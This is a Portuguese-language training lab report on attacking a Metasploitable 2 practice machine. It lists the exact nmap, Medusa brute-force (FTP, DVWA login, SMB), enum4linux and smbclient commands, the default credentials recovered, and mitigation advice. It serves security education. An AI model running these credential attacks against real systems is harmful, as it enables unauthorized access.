# Avalia-o_CyberSecurity
Treinamento DIO CyberSecurity
Relatório de Testes de Segurança – Ambiente Metasploitable

1. Ambiente Utilizado
Máquina	IP	Observações
Kali Linux	172.16.163.131	Máquina de ataque
Metasploitable 2	172.16.163.130	Máquina vulnerável (alvo)
2. Varredura Inicial de Portas

Foi realizada uma verificação inicial das principais portas de serviços conhecidos usando o Nmap:

nmap -sV -p 21,22,80,445,139 172.16.163.130


Foram identificados serviços vulneráveis nas portas FTP (21), SSH (22), HTTP (80) e SMB (139/445).

3. Criação de listas de usuários e senhas
Lista de usuários:
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Lista de senhas:
echo -e '123456\npassword\nqwerty\nmsfadmin\nadmin\nroot' > pass.txt

4. Ataque de força bruta em FTP com Medusa

Com os arquivos criados, foi realizado um ataque de brute force no serviço FTP:

medusa -h 172.16.163.130 -U users.txt -P pass.txt -M ftp -t 6

Credenciais descobertas:

Usuário: msfadmin

Senha: msfadmin

5. Teste no Formulário de Login DVWA (HTTP)

Foi realizado brute force no login do DVWA usando Medusa:

medusa -h 172.16.163.130 \
-U users.txt -P pass.txt \
-M http \
-m page:'/dvwa/login.php' \
-m form:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' \
-t 6


Resultado:
As credenciais msfadmin:msfadmin também funcionam no DVWA.

6. Enumeração SMB – enum4linux

A enumeração do servidor SMB foi realizada com:

enum4linux -a 172.16.163.130 | tee enum4_output.txt


Foram identificados usuários e serviços vulneráveis associados ao Samba.

7. Criação de listas com base na enumeração
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt

8. Ataque SMB – Medusa

Brute force sobre SMB com módulo smbnt:

medusa -h 172.16.163.130 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Credencial válida encontrada:

msfadmin:msfadmin

9. Validação com smbclient

Após a descoberta da senha válida, foi realizada a validação do acesso:

smbclient -L 172.16.163.130 -U msfadmin


A listagem de compartilhamentos foi concluída com sucesso.

10. Recomendações de Mitigação

Para aumentar a segurança do ambiente, recomenda-se:

1. Não usar credenciais padrão

Contas como msfadmin, admin, root devem ter senhas alteradas imediatamente.

2. Utilizar senhas fortes

Combinação de letras maiúsculas/minúsculas, números e caracteres especiais.

Mínimo recomendado: 12 caracteres.

3. Forçar atualização periódica de senhas

Política de troca periódica (ex.: 60–90 dias).

4. Manter sistemas atualizados

Atualizar o SO, serviços como Samba, FTP e HTTP, e dependências.

5. Restringir serviços expostos

Bloquear portas desnecessárias.

Implementar firewall com regras mínimas.

6. Implementar bloqueio por tentativas

Funções como fail2ban evitariam ataques de força bruta.
